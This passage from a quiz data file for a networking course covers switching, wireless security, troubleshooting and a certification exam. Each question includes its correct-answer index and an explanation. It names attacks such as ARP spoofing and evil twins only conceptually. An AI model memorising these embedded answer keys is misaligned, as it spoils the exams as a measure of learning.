      { id: "nf-q7-5", question: "What is STP (Spanning Tree Protocol) used for?", options: ["Resolving domain names to IP addresses for hosts that are connected via Ethernet switches", "Preventing Layer 2 switching loops in redundant network topologies while enabling failover", "Routing IP packets between different subnets using learned paths and OSPF protocol metrics", "Authenticating wireless clients before allowing them to join a WPA2 Enterprise network segment"], correctAnswer: 1, explanation: "STP prevents broadcast storms and loops by logically blocking redundant paths in switched networks while maintaining backup paths for failover." },
      { id: "nf-q7-6", question: "What is the broadcast MAC address?", options: ["00:00:00:00:00:00 — an invalid all-zero address that cannot be assigned to any device", "FF:FF:FF:FF:FF:FF — the Layer 2 broadcast address delivered to all devices on the LAN", "AA:AA:AA:AA:AA:AA — a reserved multicast group address for specific IEEE protocol groups", "01:00:00:00:00:00 — a multicast reserved address for specific IEEE spanning tree BPDUs"], correctAnswer: 1, explanation: "FF:FF:FF:FF:FF:FF is the Layer 2 broadcast address — frames sent to this address are delivered to all devices on the LAN." },
      { id: "nf-q7-7", question: "What happens when a switch receives a frame for an unknown MAC address?", options: ["The switch immediately drops the frame and logs the unknown destination MAC in its error log", "The switch floods the frame out all ports except the source port as unknown unicast flooding", "The switch forwards the unknown frame directly to the default gateway router for IP routing", "The switch encrypts the frame using a shared key and sends it to the management VLAN"], correctAnswer: 1, explanation: "When a switch doesn't have the destination MAC in its table, it floods the frame out all ports except the one it was received on — this is called unknown unicast flooding." },
      { id: "nf-q7-8", question: "What is ARP spoofing?", options: ["A legitimate routine ARP cache refresh process that all network devices perform periodically", "An attack where a malicious device sends fake ARP replies mapping its MAC to another device's IP", "A method by which DNS servers resolve hostnames to IP addresses for connected network clients", "A cryptographic algorithm used to encrypt ARP messages and protect them from interception"], correctAnswer: 1, explanation: "ARP spoofing (or poisoning) sends forged ARP replies to map the attacker's MAC to a victim's IP, enabling man-in-the-middle attacks." },
      { id: "nf-q7-9", question: "What type of cable connects two similar devices directly?", options: ["Straight-through — standard Ethernet cable connecting dissimilar devices like PC to switch", "Crossover — swaps TX/RX pairs to directly connect similar devices like switch-to-switch", "Rollover/Console — a special flat cable for CLI access to Cisco router and switch console ports", "Fiber optic — a glass or plastic strand cable used for high-speed long-distance connections"], correctAnswer: 1, explanation: "A crossover cable swaps TX/RX pairs to connect similar devices (switch-to-switch, PC-to-PC) directly — though modern devices with Auto-MDIX handle this automatically." },
      { id: "nf-q7-10", question: "What is MAC flooding?", options: ["A standard switch learning operation where the CAM table fills up during normal busy hours", "An attack overwhelming a switch's CAM table with fake MACs, causing it to act like a hub", "A legitimate network monitoring technique for capturing and analyzing Ethernet frame headers", "A VLAN configuration procedure that assigns multiple MAC addresses to a single access port"], correctAnswer: 1, explanation: "MAC flooding sends thousands of fake MAC addresses to fill the switch's CAM table, forcing it to fail-open and flood all frames to all ports — enabling traffic sniffing." },
      { id: "nf-q7-11", question: "Which cable type supports the longest distance runs?", options: ["Cat5e — twisted pair copper cable supporting 1 Gbps Ethernet up to 100 meters maximum", "Cat6 — twisted pair copper cable supporting 10 Gbps up to 55 meters or 1 Gbps at 100 meters", "Fiber optic — glass or plastic strand cable supporting distances from 550 meters to 80+ km", "Coaxial — used in legacy 10BASE-2 and 10BASE-5 networks and modern cable TV distribution"], correctAnswer: 2, explanation: "Fiber optic cables support much longer distances (up to 80+ km for single-mode) compared to copper (max 100m), with no electromagnetic interference." },
      { id: "nf-q7-12", question: "What is the maximum cable length for Cat6 Ethernet?", options: ["50 meters — the maximum supported length for Cat6 operating at 10 Gbps full speed", "100 meters — the standard maximum segment length for all standard copper Ethernet cables", "200 meters — achievable with Cat6a in shielded configurations using repeater equipment", "1000 meters — the maximum distance for multimode fiber optic OM4 cable at 10 Gbps speed"], correctAnswer: 1, explanation: "Cat6 copper Ethernet cables have a maximum segment length of 100 meters (328 feet) for reliable data transmission." },
      { id: "nf-q7-13", question: "What is the difference between single-mode and multi-mode fiber?", options: ["They carry exactly the same wavelength signals with no real performance or distance difference", "Single-mode has a smaller core for longer distances; multi-mode has a larger core for shorter runs", "Multi-mode fiber is always faster than single-mode fiber regardless of the distance involved", "Single-mode fiber is significantly cheaper to deploy than multi-mode in enterprise campus networks"], correctAnswer: 1, explanation: "Single-mode fiber has a small core (~9μm), allowing one light path for long distances. Multi-mode has a larger core (~50-62.5μm) for shorter distances." },
      { id: "nf-q7-14", question: "What switching method examines the entire frame before forwarding?", options: ["Cut-through — begins forwarding immediately after reading the destination MAC in the frame header", "Store-and-forward — receives the complete frame, checks FCS integrity, then forwards it", "Fragment-free — reads only the first 64 bytes to avoid forwarding collisions fragments", "Adaptive — dynamically switches between cut-through and store-and-forward based on error rates"], correctAnswer: 1, explanation: "Store-and-forward switching receives the entire frame, checks the FCS for errors, then forwards it — providing the highest error checking at slightly higher latency." },
      { id: "nf-q7-15", question: "What is port security on a switch?", options: ["A centralized firewall feature that filters Layer 4 traffic based on ACL permit/deny rules", "A switch feature limiting allowed MAC addresses per port, preventing unauthorized access", "A dynamic routing security protocol that authenticates route advertisements between neighbors", "A DNS security feature that cryptographically signs zone records to prevent DNS cache poisoning"], correctAnswer: 1, explanation: "Port security restricts the number of valid MAC addresses on a switch port, helping prevent MAC flooding attacks and unauthorized device connections." }
    ]
  },
  {
    quizId: "nf-q8",
    courseId: "network-fundamentals",
    title: "Wireless Networking Quiz",
    description: "Validate wireless standards, security protocols, and threat knowledge.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q8-1", question: "Which wireless standard is known as Wi-Fi 6?", options: ["802.11n — Wi-Fi 4, introduced MIMO and dual-band operation for improved throughput", "802.11ac — Wi-Fi 5, providing up to 6.9 Gbps on 5 GHz band using wider channels", "802.11ax — Wi-Fi 6, improving dense environment performance via OFDMA and MU-MIMO", "802.11g — an older 2.4 GHz-only standard offering up to 54 Mbps maximum throughput"], correctAnswer: 2, explanation: "802.11ax is Wi-Fi 6 — it provides improved performance in dense environments with features like OFDMA, MU-MIMO, and target wake time." },
      { id: "nf-q8-2", question: "What are the two common Wi-Fi frequency bands?", options: ["1 GHz and 3 GHz — used by cellular base stations and IoT networks for long range coverage", "2.4 GHz and 5 GHz — the two main bands where 2.4 GHz has range and 5 GHz has speed", "900 MHz and 1800 MHz — the primary bands used by GSM cellular mobile telephony networks", "3.5 GHz and 7 GHz — emerging bands being deployed for 5G fixed wireless access services"], correctAnswer: 1, explanation: "Wi-Fi primarily uses 2.4 GHz (longer range, more interference) and 5 GHz (shorter range, faster speeds, less interference)." },
      { id: "nf-q8-3", question: "Which wireless security protocol should NOT be used due to known vulnerabilities?", options: ["WPA3 — the latest Wi-Fi security standard providing SAE and stronger forward secrecy", "WPA2-Enterprise — enterprise wireless using 802.1X RADIUS authentication for per-user creds", "WEP — an obsolete protocol with critical RC4 cipher weaknesses crackable in minutes", "WPA2-PSK with AES — current standard pre-shared key Wi-Fi security for home and SMB use"], correctAnswer: 2, explanation: "WEP (Wired Equivalent Privacy) has critical vulnerabilities — its RC4 encryption can be cracked in minutes. Always use WPA2 or WPA3." },
      { id: "nf-q8-4", question: "What is the main improvement of WPA3 over WPA2?", options: ["Provides significantly faster wireless connection speeds due to improved encryption throughput", "SAE (Simultaneous Authentication of Equals) replacing PSK, providing forward secrecy", "Extends wireless signal range by up to 3x through improved modulation techniques", "Adds support for more simultaneously connected wireless devices through wider channels"], correctAnswer: 1, explanation: "WPA3 introduces SAE (dragonfly handshake) replacing the PSK 4-way handshake, providing forward secrecy and resistance to offline dictionary attacks." },
      { id: "nf-q8-5", question: "What is an evil twin attack?", options: ["A misconfigured dual-band router broadcasting both 2.4 GHz and 5 GHz with different SSIDs", "A rogue access point mimicking a legitimate network's SSID to capture and intercept user traffic", "A VLAN misconfiguration causing trunk ports to carry unintended VLAN traffic across switches", "A firmware update manipulation attack targeting wireless access point administrative interfaces"], correctAnswer: 1, explanation: "An evil twin is a malicious AP with the same SSID as a legitimate network — victims connect to it unknowingly, allowing the attacker to intercept all traffic." },
      { id: "nf-q8-6", question: "What does 802.1X provide in wireless networking?", options: ["Delivers significantly faster wireless speeds by improving RF modulation and channel bonding", "Port-based network access control requiring RADIUS server authentication before granting access", "Extends wireless range by having access points cooperate to relay signals across longer distances", "Provides AES-256 encryption for all wireless data frames transmitted between client and AP"], correctAnswer: 1, explanation: "802.1X provides enterprise authentication — requiring users to authenticate through a RADIUS server before gaining network access." },
      { id: "nf-q8-7", question: "What is SSID?", options: ["A wireless security protocol standard that defines encryption methods for WPA2 and WPA3", "The human-readable name that identifies and advertises a wireless network to nearby devices", "A wireless frequency band designation for the 5 GHz channels used by Wi-Fi 5 and Wi-Fi 6", "A type of wireless antenna design that focuses signal in one direction for point-to-point links"], correctAnswer: 1, explanation: "SSID (Service Set Identifier) is the human-readable name of a wireless network that devices see when scanning for available networks." },
      { id: "nf-q8-8", question: "What is a deauthentication attack?", options: ["A normal client logout process that occurs when a user disconnects from the wireless network", "Sending forged deauth frames to forcibly disconnect wireless clients from an access point", "A firewall security feature that terminates idle authenticated wireless client sessions", "A WPA3 security mechanism that prevents clients from reconnecting with weaker encryption"], correctAnswer: 1, explanation: "Deauth attacks send spoofed deauthentication frames to force clients off the network — often used before evil twin attacks or to capture WPA handshakes." },
      { id: "nf-q8-9", question: "What is the advantage of 5 GHz over 2.4 GHz?", options: ["Provides significantly longer signal range that penetrates walls and obstacles more effectively", "More available non-overlapping channels and less interference allowing faster wireless speeds", "Better signal penetration through concrete walls and thick building structural materials", "Substantially lower power consumption allowing battery-powered devices to last significantly longer"], correctAnswer: 1, explanation: "5 GHz offers more non-overlapping channels and less interference (fewer devices use it), enabling faster speeds — though with shorter range." },
      { id: "nf-q8-10", question: "What is a rogue access point?", options: ["A secondary backup access point installed by IT to provide redundancy in critical office areas", "An unauthorized AP connected to the corporate network, bypassing security controls and policies", "A wireless AP configured specifically for guest network isolation and internet-only access", "A mesh network extension node that wirelessly extends coverage in hard-to-reach areas"], correctAnswer: 1, explanation: "A rogue AP is an unauthorized access point connected to the corporate network — it bypasses security controls and can provide backdoor access." },
      { id: "nf-q8-11", question: "What encryption algorithm does WPA2 use?", options: ["RC4 — the stream cipher used by the deprecated WEP protocol, cracked in under a minute", "DES — the outdated 56-bit symmetric cipher replaced by AES for all modern security standards", "AES-CCMP — Advanced Encryption Standard with Counter Mode CBC-MAC providing robust security", "3DES — the triple-DES cipher used as a transitional replacement before AES became standard"], correctAnswer: 2, explanation: "WPA2 uses AES-CCMP (Advanced Encryption Standard with Counter Mode CBC-MAC Protocol) for robust encryption." },
      { id: "nf-q8-12", question: "What is MU-MIMO?", options: ["A wireless authentication security protocol providing multi-user identity verification", "Multi-User Multiple-Input Multiple-Output — enabling simultaneous communication with multiple devices", "A wireless frequency band designation for the latest Wi-Fi 6E 6 GHz spectrum allocation", "A directional antenna array design that focuses signal to extend range toward distant clients"], correctAnswer: 1, explanation: "MU-MIMO enables an AP to communicate with multiple devices simultaneously rather than sequentially, improving throughput in dense environments." },
      { id: "nf-q8-13", question: "What is war driving?", options: ["A wireless network performance benchmark tool that evaluates signal strength and throughput", "Physically moving through an area to discover and map wireless networks using scanning tools", "A type of DDoS attack that floods wireless access points with authentication deauth packets", "A routing protocol vulnerability where attackers manipulate wireless mesh routing tables"], correctAnswer: 1, explanation: "War driving involves physically moving through an area with wireless scanning tools to discover, map, and potentially exploit wireless networks." },
      { id: "nf-q8-14", question: "What does WPA stand for?", options: ["Wireless Protocol Access — a layer-2 security standard for access control on wired networks", "Wi-Fi Protected Access — the security standard developed by Wi-Fi Alliance to replace WEP", "Wired Protocol Authentication — an enterprise standard for port-based wired network security", "Wireless Public Access — a technology standard for providing free internet access to the public"], correctAnswer: 1, explanation: "WPA stands for Wi-Fi Protected Access — the security standard developed by the Wi-Fi Alliance to replace the insecure WEP protocol." },
      { id: "nf-q8-15", question: "What is the purpose of a wireless IDS/IPS?", options: ["Manages wireless channel assignment and transmit power to optimize RF coverage and capacity", "Detecting and preventing wireless attacks like rogue APs, deauth attacks, and unauthorized clients", "Controls wireless client roaming between access points using 802.11r fast BSS transition", "Provides centralized wireless user authentication using RADIUS and certificate-based EAP methods"], correctAnswer: 1, explanation: "Wireless IDS/IPS monitors the RF spectrum for malicious activity — detecting rogue APs, evil twins, deauth attacks, and policy violations." }
    ]
  },
  {
    quizId: "nf-q9",
    courseId: "network-fundamentals",
    title: "Network Troubleshooting Quiz",
    description: "Assess your ability to use network diagnostic tools and methodologies.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "nf-q9-1", question: "What is the first step in a structured troubleshooting methodology?", options: ["Implement the most likely solution immediately and observe whether the problem resolves itself", "Identify the problem and gather information — symptoms, scope, affected users, and recent changes", "Test a specific theory by making targeted changes and measuring the outcome on the network", "Document all findings, changes, and outcomes in the ticketing system for future reference"], correctAnswer: 1, explanation: "The first step is always identifying the problem — gathering symptoms, affected users, recent changes, and scope before forming theories." },
      { id: "nf-q9-2", question: "What does the `ping` command test?", options: ["Only DNS name resolution — verifying that hostnames properly resolve to their IP addresses", "Basic ICMP connectivity and round-trip time measuring latency and packet loss to a host", "Port availability — testing whether a specific TCP port is open and accepting connections", "Full bandwidth throughput and network speed between the source and destination endpoints"], correctAnswer: 1, explanation: "Ping sends ICMP echo requests and measures reply times, testing basic IP connectivity, latency, and packet loss to a target host." },
      { id: "nf-q9-3", question: "What does `traceroute` (or `tracert` on Windows) show?", options: ["All open TCP and UDP ports that are actively listening on the destination host system", "The network path packets take showing each router hop along the route and per-hop latency", "The complete DNS record set including A, AAAA, MX, CNAME, and TXT records for a domain", "The hardware MAC addresses of all network interface cards along the path to the destination"], correctAnswer: 1, explanation: "Traceroute maps the network path by sending packets with incrementing TTL values, revealing each router hop and its response time." },
      { id: "nf-q9-4", question: "Which command displays active network connections and listening ports?", options: ["ping — tests ICMP reachability and measures round-trip time latency to a destination host", "traceroute — shows the hop-by-hop path that packets take through the network to a destination", "netstat / ss — displays active TCP/UDP connections, listening ports, and associated process IDs", "nslookup — queries DNS servers to resolve hostnames and look up DNS records for a domain"], correctAnswer: 2, explanation: "Netstat (or ss on modern Linux) shows active TCP/UDP connections, listening ports, and associated process IDs." },
      { id: "nf-q9-5", question: "What tool is used for deep packet analysis and capture?", options: ["ping — a simple ICMP diagnostic tool for testing basic network connectivity and latency", "nslookup — a DNS query utility for resolving hostnames and troubleshooting DNS record issues", "Wireshark — a packet analyzer that captures and inspects network traffic in real-time detail", "ipconfig — a Windows command to display and manage TCP/IP network configuration settings"], correctAnswer: 2, explanation: "Wireshark is a packet analyzer that captures and inspects network traffic in real-time, allowing detailed protocol analysis." },
      { id: "nf-q9-6", question: "If you can ping an IP address but not a hostname, what is likely the issue?", options: ["A physical network cable fault or link-down condition on the local Ethernet interface port", "DNS resolution failure — the DNS server is unavailable or lacks the correct records", "A stateful firewall rule blocking ICMP Echo Reply packets from the destination host", "An IP address conflict where two devices are configured with the same IP on the subnet"], correctAnswer: 1, explanation: "If IP connectivity works but name resolution fails, the issue is with DNS — check DNS server settings, DNS service availability, and records." },
      { id: "nf-q9-7", question: "What does `nslookup` do?", options: ["Tests ICMP-based host reachability and measures the latency to a target IP or hostname", "Queries DNS servers to resolve domain names and look up specific DNS record types", "Displays the operating system's IP routing table and default gateway configuration", "Shows the current ARP cache mapping IP addresses to their hardware MAC addresses"], correctAnswer: 1, explanation: "Nslookup queries DNS servers to resolve hostnames to IPs, look up specific record types (MX, CNAME), and troubleshoot DNS issues." },
      { id: "nf-q9-8", question: "What Wireshark display filter shows only HTTP traffic?", options: ["tcp.port == 80 — shows TCP traffic on port 80 including non-HTTP protocols using that port", "http — filters to show only parsed HTTP protocol traffic in the capture", "ip.proto == http — an invalid filter syntax that Wireshark does not recognize or support", "filter http — the command-line syntax only valid in tcpdump, not Wireshark display filters"], correctAnswer: 1, explanation: "The display filter 'http' shows only HTTP protocol traffic. You can also use 'tcp.port == 80' but 'http' is more precise for parsed HTTP data." },
      { id: "nf-q9-9", question: "What does `arp -a` show?", options: ["The full DNS resolver cache with all recently resolved hostnames and their TTL values", "The ARP cache — current mappings of IP addresses to MAC addresses on the local network", "The complete IP routing table with all routes, next-hops, and outbound interface assignments", "All currently open TCP and UDP ports with their associated process names and PIDs"], correctAnswer: 1, explanation: "The `arp -a` command displays the ARP cache — showing known IP-to-MAC address mappings for devices on the local network." },
      { id: "nf-q9-10", question: "You notice high latency on hop 3 of a traceroute but normal latency on hop 4. What does this suggest?", options: ["Hop 3 has a serious network congestion problem that is affecting all traffic through that router", "Hop 3's router deprioritizes ICMP responses — subsequent normal latency confirms no real issue", "The entire network path after hop 3 is overloaded and all subsequent hop times are unreliable", "Your local DNS server is failing to resolve the hop 3 router's FQDN correctly in the output"], correctAnswer: 1, explanation: "Many routers deprioritize ICMP responses. If subsequent hops show normal latency, hop 3 is likely rate-limiting ICMP, not actually congested." },
      { id: "nf-q9-11", question: "What command shows the IP configuration on Windows?", options: ["ifconfig — the legacy Unix/Linux command for displaying and configuring network interfaces", "ipconfig — the Windows command showing IP address, subnet mask, gateway, and DNS settings", "ip addr — the modern Linux iproute2 command replacing ifconfig for interface management", "netstat — the Windows and Linux command displaying active connections and listening ports"], correctAnswer: 1, explanation: "On Windows, `ipconfig` (or `ipconfig /all` for detailed info) shows IP address, subnet mask, default gateway, and DNS settings." },
      { id: "nf-q9-12", question: "What is the purpose of `ipconfig /flushdns`?", options: ["Resets the Windows network adapter releasing and renewing DHCP IP address assignment", "Clears the local DNS resolver cache to force fresh DNS lookups for all domain queries", "Immediately releases the current DHCP IP address lease without requesting a new address", "Displays the detailed routing table including all static and dynamic routes currently active"], correctAnswer: 1, explanation: "Flushing DNS clears cached DNS records — useful when a domain's IP has changed and your system is still using the old cached record." },
      { id: "nf-q9-13", question: "What does the `pathping` command combine?", options: ["The ping command and ARP resolution to test both IP and MAC layer connectivity together", "The functionality of ping and traceroute, showing the network path and per-hop packet loss", "DNS query functionality and DHCP discovery to diagnose name resolution and addressing issues", "The netstat and route commands to show both active connections and routing table entries"], correctAnswer: 1, explanation: "Pathping combines traceroute (path discovery) with extended ping statistics, showing packet loss and latency at each hop over time." },
      { id: "nf-q9-14", question: "If a user has a 169.254.x.x IP address, what should you check?", options: ["The DNS server configuration — the user's DNS suffix search list and name server settings", "DHCP server availability — the client failed to obtain an IP and self-assigned an APIPA address", "The firewall rules — the client's outbound connection may be blocked by a stateful firewall", "The proxy settings — the browser's proxy configuration may be preventing internet connectivity"], correctAnswer: 1, explanation: "169.254.x.x (APIPA) means the DHCP client couldn't reach a DHCP server — check DHCP service, network connectivity, and DHCP scope availability." },
      { id: "nf-q9-15", question: "What is the bottom-up troubleshooting approach?", options: ["Start troubleshooting at the Application layer and work downward through the OSI model", "Start at the Physical layer and work upward through OSI layers — cable first, then MAC, IP, app", "Begin by checking DNS settings then move to verifying the default gateway configuration", "Start by rebooting all affected devices and hardware simultaneously to clear all transient faults"], correctAnswer: 1, explanation: "Bottom-up starts at Layer 1 (Physical) — check cables, link lights, then Layer 2 (MAC/switching), Layer 3 (IP), and so on up the stack." }
    ]
  },
  {
    quizId: "nf-q10",
    courseId: "network-fundamentals",
    title: "Network Fundamentals Certification Exam",
    description: "Comprehensive final exam covering all 10 modules. Pass with 80% to earn your certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "nf-q10-1", question: "Which OSI layer is responsible for logical addressing and routing?", options: ["Layer 2 — Data Link layer that handles MAC addressing and frame delivery on the local LAN", "Layer 3 — Network layer that handles IP addressing and routing packets between networks", "Layer 4 — Transport layer that handles end-to-end delivery with TCP and UDP protocols", "Layer 5 — Session layer that establishes and manages communication sessions between apps"], correctAnswer: 1, explanation: "Layer 3 (Network) handles logical addressing (IP addresses) and routing packets between different networks." },
      { id: "nf-q10-2", question: "What is the three-way handshake sequence in TCP?", options: ["ACK, SYN, FIN — acknowledgment, synchronize, and finish flags sent in sequence", "SYN, SYN-ACK, ACK — client synchronizes, server acknowledges and syncs, client confirms", "FIN, ACK, RST — the flags used for connection teardown rather than establishment", "SYN, ACK, FIN — an incorrect ordering that would not establish a valid TCP connection"], correctAnswer: 1, explanation: "TCP connection establishment: Client sends SYN → Server responds SYN-ACK → Client sends ACK. Connection is now established." },
      { id: "nf-q10-3", question: "How many usable host addresses exist in a /26 subnet?", options: ["30 usable hosts — the count for a /27 subnet with 5 host bits providing 32 total addresses", "62 usable hosts — for a /26 with 6 host bits: 2^6=64 total minus 2 reserved = 62 usable", "64 total addresses — the full count before subtracting the network and broadcast addresses", "126 usable hosts — the count for a /25 subnet which provides 128 total address slots"], correctAnswer: 1, explanation: "/26 = 6 host bits = 2^6 = 64 addresses. Minus network and broadcast = 62 usable host addresses." },
      { id: "nf-q10-4", question: "What protocol resolves IP addresses to MAC addresses?", options: ["DNS — Domain Name System that resolves domain names like google.com to IP addresses", "DHCP — Dynamic Host Configuration Protocol that assigns IP addresses to network clients", "ARP — Address Resolution Protocol that maps known IP addresses to MAC addresses on LAN", "ICMP — Internet Control Message Protocol used for ping, traceroute, and error messages"], correctAnswer: 2, explanation: "ARP (Address Resolution Protocol) resolves a known IP address to its corresponding MAC address on the local network segment." },
      { id: "nf-q10-5", question: "A switch floods a frame when:", options: ["The destination MAC is in the switch's CAM table and a direct port association exists", "The destination MAC is unknown and not present in the MAC address forwarding table", "The frame contains CRC errors detected by the FCS in the Ethernet frame trailer field", "The source VLAN and destination VLAN IDs do not match in the 802.1Q tag header"], correctAnswer: 1, explanation: "When a switch receives a frame with a destination MAC not in its table, it floods the frame out all ports except the source — this is unknown unicast flooding." },
      { id: "nf-q10-6", question: "Which wireless security protocol provides SAE (Simultaneous Authentication of Equals)?", options: ["WEP — Wired Equivalent Privacy, the deprecated standard with critical RC4 cipher weaknesses", "WPA — Wi-Fi Protected Access, the first replacement for WEP using TKIP encryption", "WPA2 — Wi-Fi Protected Access 2, using AES-CCMP and the PSK four-way handshake", "WPA3 — the latest standard introducing SAE for stronger resistance to offline dictionary attacks"], correctAnswer: 3, explanation: "WPA3 introduces SAE, which replaces PSK with a more secure dragonfly handshake, providing forward secrecy and resistance to offline attacks." },
      { id: "nf-q10-7", question: "What is the default port for HTTPS?", options: ["Port 80 — the default port for unencrypted HTTP web traffic between browsers and servers", "Port 8080 — an alternative HTTP port often used for web proxies and development servers", "Port 443 — the default port for HTTPS using TLS/SSL encryption for secure web traffic", "Port 8443 — an alternative HTTPS port sometimes used for development and admin interfaces"], correctAnswer: 2, explanation: "HTTPS uses port 443 by default for encrypted web communication over TLS/SSL." },
      { id: "nf-q10-8", question: "In the DHCP DORA process, what does the 'O' stand for?", options: ["Open — an initial message indicating the server is ready to accept DHCP client requests", "Offer — the DHCP server's response proposing an available IP address to the requesting client", "Obtain — the process by which the client retrieves its assigned configuration from the server", "Operate — the phase during which the client uses its assigned IP address on the network"], correctAnswer: 1, explanation: "DORA: Discover, Offer, Request, Acknowledge. The DHCP server sends an Offer containing an available IP address to the requesting client." },
      { id: "nf-q10-9", question: "What is the purpose of Spanning Tree Protocol (STP)?", options: ["VLAN creation and assignment — configuring multiple virtual LANs on managed switch ports", "Preventing Layer 2 loops by logically blocking redundant paths in switched topologies", "DNS resolution — resolving hostnames to IP addresses for devices on the switched network", "IP address assignment — dynamically configuring hosts with addresses on each VLAN subnet"], correctAnswer: 1, explanation: "STP prevents broadcast storms by logically disabling redundant switch paths while maintaining them as backup for failover." },
      { id: "nf-q10-10", question: "Which command would you use to view the routing table on a Linux system?", options: ["arp -a — displays the ARP cache showing IP-to-MAC mappings on the local network", "ip route / route -n — displays the kernel routing table with destinations and gateways", "ipconfig /all — the Windows command showing full network adapter configuration details", "nslookup — a DNS query tool for resolving hostnames and looking up DNS record types"], correctAnswer: 1, explanation: "On Linux, `ip route` (or the older `route -n`) displays the kernel routing table showing destination networks, gateways, and interfaces." },
      { id: "nf-q10-11", question: "What is the broadcast address for 172.16.50.0/23?", options: ["172.16.50.255 — the last address in the first half of this /23 block, not the broadcast", "172.16.51.255 — the broadcast address since /23 spans 172.16.50.0 through 172.16.51.255", "172.16.52.0 — the first address of the next adjacent /23 block after this subnet ends", "172.16.50.1 — typically assigned as the default gateway rather than the broadcast address"], correctAnswer: 1, explanation: "/23 means the network spans 172.16.50.0 – 172.16.51.255. The broadcast address is the last address: 172.16.51.255." },
      { id: "nf-q10-12", question: "What makes UDP suitable for real-time applications like VoIP?", options: ["Built-in TLS encryption providing confidentiality for all voice and video data streams", "No connection overhead and no retransmission delays, providing acceptably low latency", "Better access control security preventing unauthorized parties from joining voice calls", "Guaranteed delivery ensuring every audio packet arrives intact at the remote endpoint"], correctAnswer: 1, explanation: "UDP's connectionless nature means no handshake delay and no retransmission — slightly lost packets are preferable to delayed audio/video." },
      { id: "nf-q10-13", question: "Which DNS record type creates an alias for another domain name?", options: ["A — the Address record that maps a hostname directly to an IPv4 address on the server", "MX — the Mail Exchanger record specifying the mail servers for the domain's email", "CNAME — the Canonical Name record that creates an alias pointing one domain to another", "AAAA — the quad-A record that maps a hostname to an IPv6 address for modern connectivity"], correctAnswer: 2, explanation: "CNAME (Canonical Name) creates an alias that points one domain to another — e.g., www.example.com → example.com." },
      { id: "nf-q10-14", question: "What is 802.1Q used for?", options: ["Wireless client authentication using RADIUS and EAP for WPA2 Enterprise networks", "VLAN tagging on trunk links between switches for carrying multiple VLANs on one link", "Port security for restricting allowed MAC addresses per switch port on access links", "Spanning tree for preventing Layer 2 loops in redundant switched network topologies"], correctAnswer: 1, explanation: "IEEE 802.1Q inserts a 4-byte VLAN tag into Ethernet frames, allowing trunk links to carry traffic for multiple VLANs." },
      { id: "nf-q10-15", question: "What is the difference between static and dynamic routing?", options: ["Static routing is inherently always faster than dynamic routing for all traffic types", "Static requires manual configuration; dynamic protocols like OSPF and BGP learn routes automatically", "Dynamic routing is significantly less reliable and convergence is always unreasonably slow", "They produce identical results and selecting between them has no practical impact"], correctAnswer: 1, explanation: "Static routes are manually configured by admins. Dynamic routing uses protocols like OSPF and BGP to automatically discover and adapt routes." },
      { id: "nf-q10-16", question: "An evil twin attack targets which technology?", options: ["Wired Ethernet — targeting physical switch ports by connecting unauthorized rogue devices", "Wireless networks — creating a fake AP with the same SSID to intercept user traffic", "DNS servers — poisoning the DNS cache to redirect users to malicious IP addresses", "DHCP servers — inserting a rogue DHCP server to assign malicious gateway addresses"], correctAnswer: 1, explanation: "Evil twin attacks create a rogue AP mimicking a legitimate wireless network's SSID to trick users into connecting and intercepting their traffic." },
      { id: "nf-q10-17", question: "What does NAT (Network Address Translation) do?", options: ["Encrypts all data in transit between internal devices and external internet destinations", "Translates private RFC 1918 IP addresses to public IP addresses for internet access", "Resolves DNS domain name queries for hosts on the internal private network subnet", "Assigns DHCP IP address leases to hosts when they connect to the local network"], correctAnswer: 1, explanation: "NAT translates private RFC 1918 addresses to public IPs, allowing multiple internal devices to share one or more public IP addresses." },
      { id: "nf-q10-18", question: "What is the maximum segment length for Cat6 Ethernet cable?", options: ["50 meters — the maximum distance for Cat6 when operating at full 10 Gbps throughput", "100 meters — the standard maximum segment length for all copper Ethernet cable standards", "200 meters — achievable only with Cat6a cable using enhanced shielding and repeaters", "500 meters — the maximum distance for multimode fiber not applicable to copper Cat6 cable"], correctAnswer: 1, explanation: "All standard Ethernet copper cables (Cat5e, Cat6, Cat6a) have a maximum segment length of 100 meters (328 feet)." },
      { id: "nf-q10-19", question: "Which tool shows the path packets take through a network?", options: ["ping — tests ICMP reachability and round-trip latency to a single target destination host", "traceroute / tracert — reveals each hop along the path showing router IPs and latencies", "nslookup — queries DNS servers to resolve domain names and look up DNS record types", "netstat — displays active TCP/UDP connections and listening ports on the local system"], correctAnswer: 1, explanation: "Traceroute (tracert on Windows) shows each hop along the path to a destination, revealing routers and their response times." },
      { id: "nf-q10-20", question: "What is a VLAN's primary security benefit?", options: ["End-to-end TLS encryption of all data frames transmitted between hosts on the VLAN", "Network segmentation — isolating broadcast domains to limit attack scope and lateral movement", "Firewall replacement providing stateful packet inspection at the Layer 2 switching level", "Per-user authentication ensuring only authorized individuals can join a specific VLAN"], correctAnswer: 1, explanation: "VLANs segment the network into isolated broadcast domains, limiting the scope of broadcasts and containing lateral movement during attacks." },
      { id: "nf-q10-21", question: "IPv6 addresses are how many bits long?", options: ["32 bits — the length of IPv4 addresses written as four octets in dotted decimal notation", "64 bits — the length of the interface identifier portion in a standard /64 IPv6 subnet", "96 bits — the length used in IPv4-compatible IPv6 transition addressing mechanisms", "128 bits — the full length of IPv6 addresses providing 3.4 × 10^38 unique addresses"], correctAnswer: 3, explanation: "IPv6 addresses are 128 bits, providing approximately 3.4 × 10^38 unique addresses — solving IPv4 address exhaustion." },
      { id: "nf-q10-22", question: "What is the purpose of a default gateway?", options: ["DNS resolution — converting human-readable domain names to numerical IP addresses", "Forwards packets to destinations outside the local subnet, serving as the LAN exit point", "DHCP address assignment — dynamically providing IP addresses to devices on the subnet", "MAC address learning — recording source MAC addresses of frames received on each port"], correctAnswer: 1, explanation: "The default gateway (typically a router) forwards packets when the destination IP is not on the local subnet — it's the exit point for the LAN." },
      { id: "nf-q10-23", question: "Which Wireshark feature lets you follow an entire TCP conversation?", options: ["Display filter — a Wireshark syntax for filtering visible packets by protocol or field value", "Follow TCP Stream — reconstructs and displays the complete data exchange of a TCP session", "Capture filter — a BPF expression applied during capture to limit packets written to disk", "Protocol hierarchy — a statistical view of the protocol distribution in the capture file"], correctAnswer: 1, explanation: "Follow TCP Stream reconstructs and displays the complete data exchange of a TCP session, making it easy to read application-layer conversations." },
